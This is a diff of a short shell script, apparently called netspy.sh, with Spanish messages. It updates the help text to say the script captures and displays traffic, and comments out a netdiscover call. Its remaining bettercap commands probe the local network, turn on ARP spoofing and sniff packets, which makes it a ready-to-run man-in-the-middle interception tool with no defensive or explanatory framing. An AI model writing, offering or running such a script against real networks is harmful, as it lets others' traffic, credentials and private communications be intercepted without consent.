@@ -11,13 +11,13 @@ cat << "INFO"
 INFO
 if [ -z "$1" ]; then
         echo
-        echo "Descubre ficheros en  url de sitio web por 200 OK.. "
+        echo "Captura y muestra en pantalla el trafico."
         echo "Uso.: sh netspy.sh <nterface>"
         echo 
         exit 0
 fi
 echo
-echo 
-netdiscover -i $INTERNFACE
+echo
+#netdiscover -i $1
 bettercap  -eval "net.probe on; ticker on "
 bettercap  -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on"
